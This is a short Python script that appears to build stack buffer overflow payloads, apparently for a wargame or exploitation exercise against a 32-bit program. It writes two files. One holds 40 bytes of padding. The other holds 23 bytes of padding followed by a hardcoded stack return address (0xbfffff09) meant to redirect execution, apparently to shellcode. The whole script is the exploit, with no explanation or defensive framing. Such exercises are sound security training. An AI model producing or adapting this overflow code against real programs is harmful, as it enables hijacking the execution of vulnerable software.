fill = "a" *  40
fillb = "b" *  23

addr_shell = "\x09\xff\xff\xbf" #0xbfffff09

payload1 = fill
payload2 = fillb + addr_shell

import sys

with open("payload1", "wb") as f:
    f.write(payload1)

with open("payload2", "wb") as f:
    f.write(payload2)